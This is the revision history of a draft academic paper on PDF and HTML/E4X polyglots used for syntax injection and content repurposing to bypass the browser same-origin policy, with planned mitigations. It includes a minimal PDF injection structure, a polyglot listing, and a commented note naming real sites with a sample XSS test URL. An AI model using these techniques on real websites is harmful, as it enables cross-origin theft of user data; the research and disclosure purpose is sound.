### 2012-10-26 main.tex
Paper structure and some text

\documentclass[10pt, conference, compsocconf]{IEEEtran}

\title{Crossing Origins by Crossing Formats}

\begin{document}

\author{\IEEEauthorblockN{Jonas Magazinius}
\IEEEauthorblockA{Department of Computer Science\\
Chalmers University of Technology\\
Gothenburg, Sweden\\
jonas.magazinius@chalmers.se}
\and
\IEEEauthorblockN{Billy Rios}
\IEEEauthorblockA{dept. name of organization\\
name of organization, acronyms acceptable\\
City, United States of America\\
Email: name@xyz.com}
\and
\IEEEauthorblockN{Andrei Sabelfeld}
\IEEEauthorblockA{Department of Computer Science\\
Chalmers University of Technology\\
Gothenburg, Sweden\\
andrei@chalmers.se}
}

\maketitle

\begin{abstract}

\end{abstract}

\begin{IEEEkeywords}
Web Security; Polyglot; Cross-domain;

\end{IEEEkeywords}

\section{Introduction}
\label{sec:intro}

\subsection{Polyglots}

What and how?

Why PDF format?

\subsection{Exploiting polyglots}

A polyglot can be used for exploitation if there is a difference between how 
content is interpreted at the time of verification compared to time of use. 
It is possible to create such a polyglot by mixing content, that is benign when verified, with content, that is 
malicious when executed. The verification process will see the benign content 
and allow it, but subsequently the malicious content is executed.

In literature we find Content repurposing, content smuggling, chameleon, gifar

\subsection{Syntax injection attacks}

Injection attacks have gone from classical to sophisticated.

New breed of attacks.

\subsection{Polyglot upload attacks}

Server side verfication

Examples

\subsection{Crossing origins by crossing formats}

Describe how the attacks lead to Same-Origin Policy bypass.

\subsubsection{Syntax injection scenario}

Description of attack technique

Attack building blocks

\subsubsection{Polyglot upload scenario}

Description of attack technique

Building blocks

\section{Vulnerabilities}

\subsection{Concept}

\subsubsection{The object-tag}

The object-tag allows the developer to specify which format 
the embedded should be interpreted as.

\subsubsection{Syntax injection}

the minimal malformed structure that is required for Adobe 
Reader to consider it a PDF.

[anything] \%PDF- [anything] \
[ anything ] [space] trailer [space] << [any name value pair] 
/Root [space ] <<[any name value pair] /Pages [space]<< [any name value pair] >> [any name value pair] >> [any name value pair] >>

This means the required tokens that we need to be able to 
inject are: \%PDF-, trailer, <<, >> and /.
The \%PDF and trailer token is usually no problem. From what 
I have seen, sometimes PDF is turned to lower case which 
prevents the attacks. Quite naturally, unless the site is 
vulnerable to traditional XSS, the << and >> tokens are usually 
converted to \&lt; or some other encoding. The exception is in 
a JavaScript string context. In this context only </script> 
pose a threat, in case the < is not encoded this is usually 
prevented by escaping the slash:

var s = 'user string<\\/script>';

This is bad from a PDF syntax point of view, because \\/Root is 
not valid. But </script> is only valid when the < is directly 
followed by /. So we can create a PoC which is not vulnerable to 
traditional XSS, where the injection is  in a string and only </ 
is escaped, which will be vulnerable to PDF injection.

\subsubsection{Polyglot upload}

\subsubsection{Cross-origin communication}

For communication with the containing page, one can either use 
hostContainer.postMessage(info) or app.launchURL('\#'+info). The 
latter has the advantage that it works in Firefox which seems 
to not handle the postMessage very well.

\subsection{Instances}

How this problem presents itself in various instances of browsers and readers.

\subsubsection{Browsers}

Vulnerable: Firefox, Safari, Opera, Chrome

Not vulnerable: Internet Explorer

\subsubsection{Readers}

Vulnerable: Adobe Reader

Not vulnerable: Chrome PDF-viewer

Not tested: Apple Preview

\section{Evaluation}

\subsection{Bypassing content filters}

\subsubsection{Server-side upload filters}

Filter can verify that the benign file format is indeed benign 
without ever noticing the malicious file format hidden within.

\subsubsection{Cross-site scripting filters}

This effectively bypasses any cross-site scripting filters such as 
NoScript or filters built into browsers. Since the Reader plugin 
handles the response, the broser never gets to see the content

\subsubsection{Context sensitive filters}

Clever filters that adapt their filtering to the context in which 
the user content is included. Basically filters that allow input 
that do not form harmful HTML.

\subsection{Alexa top 100}

Alexa top 100 results

%Baidu.com (allows <>, but escapes /)
%LinkedIn (allows <>, but escapes /)
%Soso (allows <>, but escapes /)
%Youku (vulnerable to traditional XSS)
%Soku (vulnerable to traditional XSS)
%alibaba.com (allows <>, but escapes /)
%about.com (vulnerable to traditional XSS, http://linux.about.com/sitesearch.htm?q=XSS&SUName=--%3E%3Cimg+src=x+onerror=alert%281%29%3E)
%sogou.com (potential target http://www.sogou.com/web?query=%25PDF+%3C%3C+%2F+%3E%3E&_asf=www.sogou.com&_ast=1349689275&w=01019900&p=40040100&sut=11010&sst0=1349689274528)

\section{Prevention}

\subsection{Server-side mitigation}

\subsubsection{Syntax injection}

In the case of PDF; always encode tokens related to the PDF 
syntax. Generally, hard to ensure that tokens for all potential 
file formats are properly encoded without breaking anything.

\subsubsection{Polyglot upload}

Sever content from a sandbox domain.

\subsection{Browser}

Prevent object-tag type attribute to override content type 
provided by server.

\subsection{Reader}

Stricter parsing of PDF files.

Not render content served with incorrect content type.

\section{Related work}

\section{Conclusions}

\bibliographystyle{IEEEtran}
\bibliography{literature}

\end{document}

### 2012-11-01 main.tex
slight restructuring
Updated section Crossing origins

@@
 \documentclass[10pt, conference, compsocconf]{IEEEtran}
+
+\usepackage{listings}
 
@@
 
+%1 pages
 \section{Introduction}
@@
 
+General introduction for web application security.
+
+The following attacks have  been particularly successful (support with references).
+
+\subsection{Injection attacks}
+
+Injection attacks have gone from classical to sophisticated.
+
+New breed of attacks.
+
+\subsection{Content repurposing attacks}
+
+Server side verfication
+
+Examples
+
+Bridge to the next session saying that we take these attacks to the
+next level.
+
+%3 pages
+\section{Crossing origins by crossing formats}
+
+% Describe how the attacks lead to Same-Origin Policy bypass.
+
+In this section we generalize the problem and describe 
+how it can be abused to circumvent the same-origin policy.
+
 \subsection{Polyglots}
 
-What and how?
+% What and how?
 
-Why PDF format?
+A polyglot is defined as ``A person who knows several languages.'', 
+and the term is widely used in various fields of science. In computer 
+science, a polyglot is a program that is valid in multiple programming 
+languages. In this paper we use a broader definition of a programming language, 
+not limited to code meant for compilation to machine code or scripting 
+languages, but extended to any format that requires interpretation 
+before rendering.
 
-\subsection{Exploiting polyglots}
+A polyglot is composed from various constructs that are either 
+common between languages; or constructs that are language specific, but carrying 
+different meaning in each language. To maintain validity across languages, 
+one must ensure that language specific constructs are not interpreted by 
+other languages. This is often accomplished by hiding the parts of the 
+code specific to one language, in parts interpreted as comments or text 
+of another.
 
-A polyglot can be used for exploitation if there is a difference between how 
-content is interpreted at the time of verification compared to time of use. 
-It is possible to create such a polyglot by mixing content, that is benign when verified, with content, that is 
+Certain languages are particularly suitable for creating polyglots. 
+These languages either have a lot of constructs in common with other 
+languages, such as \emph{C}, or are defined such that the parser 
+ignores that which it cannot interpret, such as \emph{HTML}. The 
+latter allows for ample opportunity to hide any code specific to 
+another language, as long as there is no overlap with the syntax 
+of the first language.
+
+\subsection{Malicious polyglots}
+
+A polyglot can be used for malicious purposes if there is a difference 
+between the expected execution environment and the actual environment 
+it is executed in.
+In the situation where
+
+at the time of verification compared to time of use
+
+It is possible to create such a polyglot by mixing content, that is benign 
+when verified, with content, that is 
 malicious when executed. The verification process will see the benign content 
@@
 
-\subsection{Syntax injection attacks}
+\subsection{Syntax injection}
 
-Injection attacks have gone from classical to sophisticated.
+% Description of attack technique
 
-New breed of attacks.
+In a cross-site scripting attack, HTML syntax is injected into a 
+preexisting HTML document via vulnerable user supplied parameters. Similarly, 
+a syntax injection attack consists of injecting foreign syntax into 
+preexisting content of a different format, thereby creating a polyglot.
+The polyglot content can then be interpreted as either format; the benign 
+original format, or the malicious user-supplied format.
 
-\subsection{Polyglot upload attacks}
+% Attack building blocks
 
-Server side verfication
+For this attack to be successful certain requirements needs to be 
+fulfilled. 
+\begin{itemize}
+	\item The original content must include parameters under the control of the 
+				user.
+	\item The user-supplied content must circumvent any validation or filtering.
+	\item There must exist a way of coercing the resulting polyglot to be 
+				interpreted as the malicious format.
+	\item The malicious format must have capabilities that are restricted or 
+				missing in the benign format.
+\end{itemize}
 
-Examples
+% Scenarios
 
-\subsection{Crossing origins by crossing formats}
+Much like a cross-site scripting attack, we consider a scenario where a website serves documents which are based upon user-supplied content.
 
-Describe how the attacks lead to Same-Origin Policy bypass.
+The same-origin policy is intended to prevent a document from one origin from accessing the content of a document of another origin.
+At the same time it allows a script-tag in one document to include JavaScript of another origin and execute it in the context of that document.
+If an attacker is able to inject an HTML-document with JavaScript syntax in such a way that it became valid JavaScript, the attacker could include the document across origins via a script-tag and extract its content, thereby circumventing the same-origin policy.
 
-\subsubsection{Syntax injection scenario}
+Consider the php-program in listing \ref{lst:php-sample}. Apart from being vulnerable to traditional cross-site scripting, it is vulnerable
 
-Description of attack technique
+By requesting the site with parameter $guess=</body></html>;x=<html><body>$, the resulting document, listing \ref{lst:html-js}, is both malformed but valid HTML and valid JavaScript in browsers that support E4X.
+An attacker can now include the page as a script in the attackers page and extract the secret from variable x.
 
-Attack building blocks
+\begin{lstlisting}[label=lst:php-sample,caption=Vulnerable PHP-program,captionpos=b]
+<?php
+session_start();
+$_SESSION["secret"] = rand();
+?>
+<html><body>
+Your guess: <?=$_GET["guess"]?>!
+The secret is: <?=$_SESSION["secret"]?>
+</body></html>
+\end{lstlisting}
+\begin{lstlisting}[label=lst:html-js,caption=Vulnerable PHP-program,captionpos=b]
+<html><body>
+Your guess: </body></html>;x=<html><body>!
+The secret is: 521352342
+</body></html>
+\end{lstlisting}$
 
-\subsubsection{Polyglot upload scenario}
+This attack has been suggested as a way to bypass Content Security Policy.
+As E4X is only supported in the SpiderMonkey JavaScript engine, used in Firefox, this limits the exploitability of this scenario.
+While this is an unlikely scenario using JavaScript as the injected format, section \ref{sec:vuln} will show how this can be achieved in practice.
 
-Description of attack technique
+\subsection{Content repurposing}
 
-Building blocks
+% Description of attack technique
+A content repurposing attack attacks a service that accepts and serves user supplied files.
+The files are verified to be of a certain benign file type, e.g.
+an image, before being served to the end user.
+By submitting a polyglot to such a service, an attacker can trick the service into serving malicious content under the origin of the service.
+The service can verify the
 
+% Building blocks
+For this attack to be successful certain requirements needs to be 
+fulfilled.
+
+\begin{itemize}
+	\item The service must accept and serve user-supplied files.
+	\item The service must verify the user-supplied polyglot as the benign 
+				format.
+	\item There must exist a way of coercing the polyglot to be 
+				interpreted as the malicious format.
+\end{itemize}
+
+% Scenarios
+
+%3 pages
 \section{Vulnerabilities}
+\label{sec:vuln}
 
 \subsection{Concept}
+
+Why PDF format?
 
@@
 [ anything ] [space] trailer [space] << [any name value pair] 
-/Root [space ] <<[any name value pair] /Pages [space]<< [any name value pair] >> [any name value pair] >> [any name value pair] >>
+/Root [space] <<[any name value pair] /Pages [space]<< [any name value pair] 
+>> [any name value pair] >> [any name value pair] >>
 
@@
 
+%3 pages
 \section{Evaluation}
@@
 This effectively bypasses any cross-site scripting filters such as 
-NoScript or filters built into browsers. Since the Reader plugin 
-handles the response, the broser never gets to see the content
+NoScript or filters built into browsers. Since the Reader plug-in 
+handles the response, the browser never gets to see the content
 
@@
 
-\section{Prevention}
+%1-2 pages
+\section{Mitigation}
 
@@
 
-Sever content from a sandbox domain.
+Serve content from a sandbox domain.
 
@@
 
+%1 page
 \section{Related work}
 
+%1 page
 \section{Conclusions}
 
+We have contacted the vendors...
+
+Mentioned that Adobe was notified long time ago.
+
+%1-2 pages
 \bibliographystyle{IEEEtran}

### 2012-11-01 main.tex
abstract

@@
 
-\author{\IEEEauthorblockN{Jonas Magazinius}
-\IEEEauthorblockA{Department of Computer Science\\
-Chalmers University of Technology\\
-Gothenburg, Sweden\\
-jonas.magazinius@chalmers.se}
-\and
-\IEEEauthorblockN{Billy Rios}
-\IEEEauthorblockA{dept. name of organization\\
-name of organization, acronyms acceptable\\
-City, United States of America\\
-Email: name@xyz.com}
-\and
-\IEEEauthorblockN{Andrei Sabelfeld}
-\IEEEauthorblockA{Department of Computer Science\\
-Chalmers University of Technology\\
-Gothenburg, Sweden\\
-andrei@chalmers.se}
-}
+% \author{\IEEEauthorblockN{Jonas Magazinius}
+% \IEEEauthorblockA{Department of Computer Science\\
+% Chalmers University of Technology\\
+% Gothenburg, Sweden\\
+% jonas.magazinius@chalmers.se}
+% \and
+% \IEEEauthorblockN{Billy Rios}
+% \IEEEauthorblockA{dept. name of organization\\
+% name of organization, acronyms acceptable\\
+% City, United States of America\\
+% Email: name@xyz.com}
+% \and
+% \IEEEauthorblockN{Andrei Sabelfeld}
+% \IEEEauthorblockA{Department of Computer Science\\
+% Chalmers University of Technology\\
+% Gothenburg, Sweden\\
+% andrei@chalmers.se}
+% }
 
@@
 \begin{abstract}
-
+  In a heterogeneous system like the web, information is exchanged
+  between components in versatile formats. A new breed of attacks is
+  on the rise that exploit the mismatch between the expected and
+  provided content. \emph{Injection attacks} are becoming increasingly
+  more sophisticated by operating across multiple
+  languages. \emph{Content repurposing} attacks supply malicious
+  payload that appears formatted as benign content.
+%
+  This paper focuses on the root cause of a large class of attacks:
+  \emph{polyglots}. A polyglot is a program that is valid in multiple
+  programming languages. Polyglots allow multiple interpretation of
+  the content, providing a new space of attack vectors. We
+  characterize of what constitutes a dangerous format in the web
+  setting and identify particularly dangerous formats, with PDF as the
+  prime example. We demonstrate that polyglot-based attacks on the web
+  open up for insecure communication across Internet origins. We
+  perform a systematic study of PDF-based injection and content
+  repurposing attacks. We evaluate the current practice in
+  client/server content filtering and PDF readers for polyglot-based
+  attacks, and report on vulnerabilities in the top 100 Alexa web sites.
+  Our recommendations for protective measures on server side, in 
+  browsers, and in PDF readers show how to mitigate the attacks.
 \end{abstract}
@@
 \begin{IEEEkeywords}
-Web Security; Polyglot; Cross-domain;
-
+Web Security; Polyglot; Injection; Cross-domain.
 \end{IEEEkeywords}
@@
 </body></html>
-\end{lstlisting}$
+\end{lstlisting}
+\if 0
+$
+\fi
 

### 2012-11-07 main.tex
Updated section Crossing origins

@@
 
-Server side verfication
+Server side verification
 
@@
 science, a polyglot is a program that is valid in multiple programming 
-languages. In this paper we use a broader definition of a programming language, 
+languages. In this paper we use a broader definition of a programming 
+language, 
 not limited to code meant for compilation to machine code or scripting 
@@
 A polyglot is composed from various constructs that are either 
-common between languages; or constructs that are language specific, but carrying 
+common between languages; or constructs that are language specific, but 
+carrying 
 different meaning in each language. To maintain validity across languages, 
@@
 between the expected execution environment and the actual environment 
-it is executed in.
+it is executed in. If the content is verified to be benign in 
 In the situation where
@@
 
+The target in this scenario is a user of the vulnerable website. The polyglot 
+is served in the benign format on the vulnerable server. However, the attack 
+is initiated from a page belonging to the attacker. While the user is logged 
+in to the service that the vulnerable website provides, the user 
+unsuspectingly visits the attackers malicious website. The page embeds the 
+polyglot content, but coerces it to be interpreted as the malicious format. 
+The attacker can now exploit the vulnerability, either by making requests to 
+the vulnerable website in the context of the user; or by extracting 
+information about the user that is stored on the vulnerable website.
+
+In situations like these, the same-origin policy is intended to prevent a document from one origin from accessing the content of a document of another origin.
+However, depending on the capabilities of the malicious format used in the attack, it may be possible to circumvent the same-origin policy.
+
 For this attack to be successful certain requirements needs to be 
@@
 \begin{itemize}
-	\item The original content must include parameters under the control of the 
-				user.
+	\item The original content must embed external information under the control 
+				of the attacker.
 	\item The user-supplied content must circumvent any validation or filtering.
@@
 
-Much like a cross-site scripting attack, we consider a scenario where a website serves documents which are based upon user-supplied content.
+%Much like a cross-site scripting attack, we consider a scenario where a 
+%website serves documents which are based upon user-supplied information.
 
-The same-origin policy is intended to prevent a document from one origin from accessing the content of a document of another origin.
-At the same time it allows a script-tag in one document to include JavaScript of another origin and execute it in the context of that document.
-If an attacker is able to inject an HTML-document with JavaScript syntax in such a way that it became valid JavaScript, the attacker could include the document across origins via a script-tag and extract its content, thereby circumventing the same-origin policy.
+%The same-origin policy is intended to prevent a document from one origin from 
+%accessing the content of a document of another origin. 
+As an example the same-origin policy allows a script-tag in one document to 
+include JavaScript of another origin and execute it in the context of that 
+document. If an attacker is able to inject an HTML document with JavaScript 
+syntax in such a way that it became valid JavaScript, the attacker could 
+include the document across origins via a script-tag and extract its content, 
+thereby circumventing the same-origin policy.
 
-Consider the php-program in listing \ref{lst:php-sample}. Apart from being vulnerable to traditional cross-site scripting, it is vulnerable
+%Consider the php-program in listing \ref{lst:php-sample}. Apart from being 
+%vulnerable to traditional cross-site scripting, it is vulnerable
 
-By requesting the site with parameter $guess=</body></html>;x=<html><body>$, the resulting document, listing \ref{lst:html-js}, is both malformed but valid HTML and valid JavaScript in browsers that support E4X.
-An attacker can now include the page as a script in the attackers page and extract the secret from variable x.
+%By requesting the site with parameter $guess=</body></html>;x=<html><body>$, 
+%the resulting document, 
+The document in listing \ref{lst:html-js}, is both malformed but valid HTML 
+and valid JavaScript in browsers that support E4X. The document can be 
+included as a script in another document and the secret can be extracted from 
+variable x. This implies that if an attacker is able to inject HTML syntax 
+into a document, such that the result is two balanced E4X trees, then 
+information can be extracted across origins.
 
-\begin{lstlisting}[label=lst:php-sample,caption=Vulnerable PHP-program,captionpos=b]
-<?php
-session_start();
-$_SESSION["secret"] = rand();
-?>
+\begin{lstlisting}[label=lst:html-js, caption=HTML / E4X Polyglot]
 <html><body>
-Your guess: <?=$_GET["guess"]?>!
-The secret is: <?=$_SESSION["secret"]?>
+Hello </body></html>;x=<html><body>!
+Your secret is 'safe with me'.
 </body></html>
 \end{lstlisting}
-\begin{lstlisting}[label=lst:html-js,caption=Vulnerable PHP-program,captionpos=b]
-<html><body>
-Your guess: </body></html>;x=<html><body>!
-The secret is: 521352342
-</body></html>
-\end{lstlisting}
-\if 0
-$
-\fi
 
-This attack has been suggested as a way to bypass Content Security Policy.
-As E4X is only supported in the SpiderMonkey JavaScript engine, used in Firefox, this limits the exploitability of this scenario.
-While this is an unlikely scenario using JavaScript as the injected format, section \ref{sec:vuln} will show how this can be achieved in practice.
+This attack has been suggested as a potential way to bypass Content Security 
+Policy \ref{required}. 
+As E4X is only supported in the SpiderMonkey JavaScript engine, used in 
+Firefox, this limits the exploitability of this example.
+While this is an unlikely scenario using JavaScript as the injected format, 
+section \ref{sec:vuln} will show how this can be achieved in practice.
+
+% The below example is too long and complicated.
+
+%\begin{lstlisting}[label=lst:php-sample,caption=Vulnerable PHP-program,captionpos=b]
+%<?php
+%session_start();
+%$_SESSION["secret"] = rand();
+%?>
+%<html><body>
+%Your guess: <?=$_GET["guess"]?>!
+%The secret is: <?=$_SESSION["secret"]?>
+%</body></html>
+%\end{lstlisting}
+%\begin{lstlisting}[label=lst:html-js,caption=Vulnerable %PHP-program,captionpos=b]
+%<html><body>
+%Your guess: </body></html>;x=<html><body>!
+%The secret is: 521352342
+%</body></html>
+%\end{lstlisting}
+%\if 0
+%$
+%\fi
 
@@
 % Description of attack technique
-A content repurposing attack attacks a service that accepts and serves user supplied files.
+A content repurposing attack attacks a website that allows and serves user supplied files.
+This could be a file sharing service, an image database, or a job search service.
 The files are verified to be of a certain benign file type, e.g.
@@
 By submitting a polyglot to such a service, an attacker can trick the service into serving malicious content under the origin of the service.
-The service can verify the
+The service will verify the file, assuming that it is of the benign format, but once the content is served an attacker can coerce the content to be interpreted as the malicious format.
 
 % Building blocks
+
+The difference in this scenario from the previous one is in the nature of the vulnerability.
+Where in the previous scenario an existing document was injected to become a polyglot, this scenario targets services which allow an attacker to introduce new documents.
+As in the previous scenario, the target is a user of the vulnerable website.
+
 For this attack to be successful certain requirements needs to be 
@@
 	\item The service must accept and serve user-supplied files.
-	\item The service must verify the user-supplied polyglot as the benign 
-				format.
+	\item The service must verify the user-supplied polyglot under the 
+				assumption that it is in the benign format.
 	\item There must exist a way of coercing the polyglot to be 
@@
 
+In this section we give concrete examples of the attacks described in the previous section, using the PDF format as the running example.
+
 \subsection{Concept}
 
-Why PDF format?
+\subsubsection{The PDF format}
+
+% Why PDF format?
+
+The PDF format is a widely used, text based format with powerful capabilities.
+It can be used for displaying text, rendering graphics, animation and dynamic content.
+It is also a container format which allows for embedding of other files and formats.
+This and the fact that it is designed to be robust against errors, provides us with a format that is powerful, flexible and ideal for creating malicious polyglots.
+
+%Several design choices
+
+Furthermore the PDF format is of particular interest to us because it can execute JavaScript and send HTTP requests to the server from which the document originated.
 
@@
 
-The object-tag allows the developer to specify which format 
-the embedded should be interpreted as.
+%The object-tag allows the developer to specify which format 
+%the embedded content should be interpreted as.
 
-\subsubsection{Syntax injection}
+The object-tag is used to embed content in a web page, which requires a plug-in to run.
+The plug-in is selected based on the MIME-type of the content, but because the server delivering the content might not be able to determine its format, the object tag allows a developer to set the type-attribute to guide the browser in which plug-in to run.
+When the type attribute is used, the corresponding plug-in is run regardless of which MIME-type the server returns and it is up to the plug-in to respond to and handle the content it is served.
+
+In the case of the Adobe Reader plug-in completely disregards the MIME-type supplied by the server and will attempt to interpret any content as PDF.
+
+\subsubsection{Cross-origin communication}
+
+For communication with the containing page, one can either use 
+hostContainer.postMessage(info) or app.launchURL('\#'+info). The 
+latter has the advantage that it works in Firefox which seems 
+to not handle the postMessage very well.
+
+\subsection{Syntax injection}
 
@@
 
-\subsubsection{Polyglot upload}
-
-\subsubsection{Cross-origin communication}
-
-For communication with the containing page, one can either use 
-hostContainer.postMessage(info) or app.launchURL('\#'+info). The 
-latter has the advantage that it works in Firefox which seems 
-to not handle the postMessage very well.
+\subsection{Polyglot upload}
 
@@
 
+This section will describe our recommendations for mitigation in each of the affected components.
+
 \subsection{Server-side mitigation}
@@
 
-In the case of PDF; always encode tokens related to the PDF 
-syntax. Generally, hard to ensure that tokens for all potential 
-file formats are properly encoded without breaking anything.
+%In the case of PDF; always encode tokens related to the PDF 
+%syntax. Generally, hard to ensure that tokens for all potential 
+%file formats are properly encoded without breaking anything.
+
+Preventing syntax injection attacks on the server-side poses severe challenges.
+Even server-side filtering of HTML syntax to prevent cross-side scripting attacks has proved difficult due to the many contexts in which JavaScript can be introduced.
+Filtering all potentially harmful tokens from all formats in which a document could be interpreted, will likely be near impossible.
 

### 2012-11-08 main.tex
Mitigation

@@
 % \author{\IEEEauthorblockN{Jonas Magazinius} 
-% \IEEEauthorblockA{Department of Computer Science\\
+% \IEEEauthorblockA{Department ofComputer Science\\ 
 % Chalmers University of Technology\\ 
@@
 \begin{abstract}
-  In a heterogeneous system like the web, information is exchanged
-  between components in versatile formats. A new breed of attacks is
-  on the rise that exploit the mismatch between the expected and
-  provided content. \emph{Injection attacks} are becoming increasingly
-  more sophisticated by operating across multiple
-  languages. \emph{Content repurposing} attacks supply malicious
-  payload that appears formatted as benign content.
+ In a heterogeneous system like the web, information is
+exchanged between components in versatile formats. A new breed of attacks is on
+the rise that exploit the mismatch between the expected and provided content.
+\emph{Injection attacks} are becoming increasingly more sophisticated by
+operating across multiple languages. \emph{Content repurposing} attacks supply
+malicious payload that appears formatted as benign content. 
 % 
-  This paper focuses on the root cause of a large class of attacks:
-  \emph{polyglots}. A polyglot is a program that is valid in multiple
-  programming languages. Polyglots allow multiple interpretation of
-  the content, providing a new space of attack vectors. We
-  characterize of what constitutes a dangerous format in the web
-  setting and identify particularly dangerous formats, with PDF as the
-  prime example. We demonstrate that polyglot-based attacks on the web
-  open up for insecure communication across Internet origins. We
-  perform a systematic study of PDF-based injection and content
-  repurposing attacks. We evaluate the current practice in
-  client/server content filtering and PDF readers for polyglot-based
-  attacks, and report on vulnerabilities in the top 100 Alexa web sites.
-  Our recommendations for protective measures on server side, in 
-  browsers, and in PDF readers show how to mitigate the attacks.
+This paper focuseson the root cause of a large class of attacks: \emph{polyglots}. 
+A polyglot is aprogram that is valid in multiple programming languages. Polyglots allow
+multiple interpretation of the content, providing a new space of attack vectors.
+We characterize of what constitutes a dangerous format in the web setting and
+identify particularly dangerous formats, with PDF as the prime example. We
+demonstrate that polyglot-based attacks on the web open up for insecure
+communication across Internet origins. We perform a systematic study of
+PDF-based injection and content repurposing attacks. We evaluate the current
+practice in client/server content filtering and PDF readers for polyglot-based
+attacks, and report on vulnerabilities in the top 100 Alexa web sites. Our
+recommendations for protective measures on server side, in browsers, and in PDF
+readers show how to mitigate the attacks.
 \end{abstract}
@@
 
-The following attacks have  been particularly successful (support with references).
+The following attacks have been particularly successful (support with
+references).
 
@@
 
-Bridge to the next session saying that we take these attacks to the
-next level.
+Bridge to the next section saying that we take these attacks to the next level.
 
@@
 
-In this section we generalize the problem and describe 
-how it can be abused to circumvent the same-origin policy.
+In this section we generalize the problem and describe how it can be abused to
+circumvent the same-origin policy.
 
@@
 
-A polyglot is defined as ``A person who knows several languages.'', 
-and the term is widely used in various fields of science. In computer 
-science, a polyglot is a program that is valid in multiple programming 
-languages. In this paper we use a broader definition of a programming 
-language, 
-not limited to code meant for compilation to machine code or scripting 
-languages, but extended to any format that requires interpretation 
-before rendering.
+A polyglot is defined as ``A person who knows several languages.'', and the term
+is widely used in various fields of science. In computer science, a polyglot is
+a program that is valid in multiple programming languages. In this paper we use
+a broader definition of a programming language, not limited to code meant for
+compilation to machine code or scripting languages, but extended to any format
+that requires interpretation before rendering.
 
-A polyglot is composed from various constructs that are either 
-common between languages; or constructs that are language specific, but 
-carrying 
-different meaning in each language. To maintain validity across languages, 
-one must ensure that language specific constructs are not interpreted by 
-other languages. This is often accomplished by hiding the parts of the 
-code specific to one language, in parts interpreted as comments or text 
-of another.
+A polyglot is composed from various constructs that are either common between
+languages; or constructs that are language specific, but carrying different
+meaning in each language. To maintain validity across languages, one must ensure
+that language specific constructs are not interpreted by other languages. This
+is often accomplished by hiding the parts of the code specific to one language,
+in parts interpreted as comments or text of another.
 
-Certain languages are particularly suitable for creating polyglots. 
-These languages either have a lot of constructs in common with other 
-languages, such as \emph{C}, or are defined such that the parser 
-ignores that which it cannot interpret, such as \emph{HTML}. The 
-latter allows for ample opportunity to hide any code specific to 
-another language, as long as there is no overlap with the syntax 
-of the first language.
+Certain languages are particularly suitable for creating polyglots. These
+languages either have a lot of constructs in common with other languages, such
+as \emph{C}, or are defined such that the parser ignores that which it cannot
+interpret, such as \emph{HTML}. The latter allows for ample opportunity to hide
+any code specific to another language, as long as there is no overlap with the
+syntax of the first language.
 
@@
 
-A polyglot can be used for malicious purposes if there is a difference 
-between the expected execution environment and the actual environment 
-it is executed in. If the content is verified to be benign in 
+A polyglot can be used for malicious purposes if there is a difference between
+the expected execution environment and the actual environment it is executed in.
+If the content is verified to be benign in
+
   In the situation where
@@
 
-It is possible to create such a polyglot by mixing content, that is benign 
-when verified, with content, that is 
-malicious when executed. The verification process will see the benign content 
-and allow it, but subsequently the malicious content is executed.
+It is possible to create such a polyglot by mixing content, that is benign when
+verified, with content, that is malicious when executed. The verification
+process will see the benign content and allow it, but subsequently the malicious
+content is executed.
 
@@
 
-In a cross-site scripting attack, HTML syntax is injected into a 
-preexisting HTML document via vulnerable user supplied parameters. Similarly, 
-a syntax injection attack consists of injecting foreign syntax into 
-preexisting content of a different format, thereby creating a polyglot.
-The polyglot content can then be interpreted as either format; the benign 
-original format, or the malicious user-supplied format.
+In a cross-site scripting attack, HTML syntax is injected into a preexisting
+HTML document via vulnerable user supplied parameters. Similarly, a syntax
+injection attack consists of injecting foreign syntax into preexisting content
+of a different format, thereby creating a polyglot. The polyglot content can
+then be interpreted as either format; the benign original format, or the
+malicious user-supplied format.
 
@@
 
-The target in this scenario is a user of the vulnerable website. The polyglot 
-is served in the benign format on the vulnerable server. However, the attack 
-is initiated from a page belonging to the attacker. While the user is logged 
-in to the service that the vulnerable website provides, the user 
-unsuspectingly visits the attackers malicious website. The page embeds the 
-polyglot content, but coerces it to be interpreted as the malicious format. 
-The attacker can now exploit the vulnerability, either by making requests to 
-the vulnerable website in the context of the user; or by extracting 
-information about the user that is stored on the vulnerable website.
+% Browser, plug-in/content handler, target, vulnerability, server
 
-In situations like these, the same-origin policy is intended to prevent a document from one origin from accessing the content of a document of another origin.
-However, depending on the capabilities of the malicious format used in the attack, it may be possible to circumvent the same-origin policy.
+The target in this scenario is a user of the vulnerable website. The polyglot is
+served in the benign format on the vulnerable server. However, the attack is
+initiated from a page belonging to the attacker. While the user is logged in to
+the service that the vulnerable website provides, the user unsuspectingly visits
+the attackers malicious website. The page embeds the polyglot content, but
+coerces it to be interpreted as the malicious format. The attacker can now
+exploit the vulnerability, either by making requests to the vulnerable website
+in the context of the user; or by extracting information about the user that is
+stored on the vulnerable website.
 
-For this attack to be successful certain requirements needs to be 
-fulfilled. 
+In situations like these, the same-origin policy is intended to prevent a
+document from one origin from accessing the content of a document of another
+origin. However, depending on the capabilities of the malicious format used in
+the attack, it may be possible to circumvent the same-origin policy.
+
+For this attack to be successful certain requirements needs to be fulfilled.
 \begin{itemize} 
-	\item The original content must embed external information under the control 
-				of the attacker.
-	\item The user-supplied content must circumvent any validation or filtering.
+	\item The original content must embed external information under the 
+	control of the attacker. 
+	\item The user-supplied content must circumvent any validation or 
+	filtering. 
 	\item There must exist a way of coercing the resulting polyglot to be 
@@
 %accessing the content of a document of another origin. 
-As an example the same-origin policy allows a script-tag in one document to 
-include JavaScript of another origin and execute it in the context of that 
-document. If an attacker is able to inject an HTML document with JavaScript 
-syntax in such a way that it became valid JavaScript, the attacker could 
-include the document across origins via a script-tag and extract its content, 
-thereby circumventing the same-origin policy.
+As an example the
+same-origin policy allows a script-tag in one document to include JavaScript of
+another origin and execute it in the context of that document. If an attacker is
+able to inject an HTML document with JavaScript syntax in such a way that it
+became valid JavaScript, the attacker could include the document across origins
+via a script-tag and extract its content, thereby circumventing the same-origin
+policy.
 
@@
 %the resulting document, 
-The document in listing \ref{lst:html-js}, is both malformed but valid HTML 
-and valid JavaScript in browsers that support E4X. The document can be 
-included as a script in another document and the secret can be extracted from 
-variable x. This implies that if an attacker is able to inject HTML syntax 
-into a document, such that the result is two balanced E4X trees, then 
-information can be extracted across origins.
+The document in listing \ref{lst:html-js}, is both
+malformed but valid HTML and valid JavaScript in browsers that support E4X. The
+document can be included as a script in another document and the secret can be
+extracted from variable x. This implies that if an attacker is able to inject
+HTML syntax into a document, such that the result is two balanced E4X trees,
+then information can be extracted across origins.
 
@@
 This attack has been suggested as a potential way to bypass Content Security
-Policy \ref{required}. 
